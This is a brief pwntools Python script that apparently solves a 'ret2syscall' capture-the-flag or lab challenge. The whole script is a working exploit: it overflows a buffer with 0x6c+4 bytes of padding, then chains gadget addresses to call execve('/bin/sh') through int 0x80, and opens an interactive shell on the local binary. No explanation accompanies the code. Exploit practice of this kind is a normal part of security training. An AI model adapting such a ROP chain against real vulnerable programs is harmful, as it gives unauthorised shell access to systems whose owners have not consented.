from pwn import *

offset = 0x6c + 4
bin_sh_addr = 0x080be408
int_addr = 0x08049421
eax_addr = 0x080bb196
edx_ecx_ebx_addr = 0x0806eb90

payload = (offset * b'A' \
        + p32(eax_addr) + p32(0xb) \
        + p32(edx_ecx_ebx_addr) + p32(0) + p32(0) + p32(bin_sh_addr) \
        + p32(int_addr))

sh = process("./ret2syscall")
sh.sendline(payload)
sh.interactive()
